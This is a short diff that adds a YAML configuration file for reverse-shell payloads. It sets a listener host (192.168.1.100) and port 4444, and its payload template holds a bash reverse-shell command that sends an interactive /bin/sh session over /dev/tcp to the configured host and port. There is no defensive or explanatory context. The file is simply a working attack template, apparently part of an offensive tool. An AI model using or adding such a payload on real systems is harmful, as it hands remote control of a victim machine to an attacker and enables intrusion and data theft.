@@ -1,0 +1,10 @@
+reverse_shell_config:
+  r_host: "192.168.1.100"  
+  r_port: 4444
+  
+payload_template:
+  - name: "Bash revshell"
+    choice_c: "1"
+    code: |
+      /bin/sh -i >& /dev/tcp/{{r_host}}/{{r_port}} 0>&1
+    
